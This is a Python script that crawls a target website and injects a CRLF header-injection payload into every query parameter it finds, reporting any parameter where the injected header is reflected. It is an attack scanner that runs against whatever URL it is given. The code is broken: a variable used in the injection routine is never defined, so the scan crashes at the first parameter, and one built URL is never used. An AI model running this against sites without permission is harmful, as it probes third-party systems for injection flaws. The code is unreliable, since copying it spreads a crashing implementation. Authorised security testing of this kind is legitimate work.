import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import re
import sys
import time

# Constants
CRLF_PAYLOAD = "\r\nInjected-Header: injected_value\r\n"
USER_AGENT = "CRLF-Injection-Scanner/1.0"
TIMEOUT = 10  # seconds
DELAY_BETWEEN_REQUESTS = 1  # seconds to prevent overwhelming the server

class CRLFScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.visited_urls = set()
        self.vulnerable_urls = []

    def crawl(self, url):
        """Recursively crawl URLs starting from the base URL."""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)
        print(f"Crawling URL: {url}")
        try:
            response = requests.get(url, headers={'User-Agent': USER_AGENT}, timeout=TIMEOUT)
            if response.status_code != 200:
                print(f"Skipping URL {url} due to status code {response.status_code}")
                return
            soup = BeautifulSoup(response.text, 'html.parser')
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link.get('href')
                full_url = urljoin(url, href)
                parsed_url = urlparse(full_url)
                # Only crawl URLs within the same domain
                if parsed_url.netloc == urlparse(self.base_url).netloc:
                    self.crawl(full_url)
        except requests.exceptions.RequestException as e:
            print(f"Error crawling URL {url}: {e}")

    def find_parameters(self, url):
        """Extract query parameters from a URL."""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params

    def inject_crlf(self, url, params):
        """Inject CRLF payload into each parameter and test for vulnerabilities."""
        for param in params:
            original_value = params[param][0]
            injected_value = original_value + CRLF_PAYLOAD
            params_copy = params.copy()
            params_copy[param] = injected_value
            injected_query = urlencode(params_copy, doseq=True)
            injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{injected_query}"
            print(f"Testing parameter '{param}' with CRLF injection.")
            try:
                response = requests.get(url, params=params_copy, headers={'User-Agent': USER_AGENT}, timeout=TIMEOUT)
                # Check for injected headers or anomalies in response
                if self.detect_crlf_injection(response):
                    print(f"[VULNERABLE] {url} parameter '{param}'")
                    self.vulnerable_urls.append((url, param))
            except requests.exceptions.RequestException as e:
                print(f"Error testing URL {url} with parameter '{param}': {e}")
            time.sleep(DELAY_BETWEEN_REQUESTS)

    def detect_crlf_injection(self, response):
        """Detect CRLF injection by searching for injected patterns in the response."""
        # Simple detection: look for the injected header in the response headers
        if 'Injected-Header' in response.headers:
            return True
        # Additionally, search for the payload in the response body
        if CRLF_PAYLOAD.strip() in response.text:
            return True
        return False

    def scan(self):
        """Perform the CRLF injection scan."""
        print(f"Starting crawl on base URL: {self.base_url}")
        self.crawl(self.base_url)
        print("Crawling completed.")
        print(f"Found {len(self.visited_urls)} unique URLs.")
        print("Beginning CRLF injection tests...")
        for url in self.visited_urls:
            params = self.find_parameters(url)
            if params:
                self.inject_crlf(url, params)
        print("CRLF injection testing completed.")
        self.report()

    def report(self):
        """Generate a report of vulnerable URLs."""
        if self.vulnerable_urls:
            print("\n=== CRLF Injection Vulnerabilities Detected ===")
            for vuln in self.vulnerable_urls:
                print(f"URL: {vuln[0]} | Parameter: {vuln[1]}")
            print("=== End of Report ===")
        else:
            print("\nNo CRLF injection vulnerabilities detected.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python crlf_scanner.py <target_url>")
        sys.exit(1)
    target_url = sys.argv[1]
    # Validate URL
    if not re.match(r'^https?://', target_url):
        print("Please provide a valid URL starting with http:// or https://")
        sys.exit(1)
    scanner = CRLFScanner(target_url)
    scanner.scan()
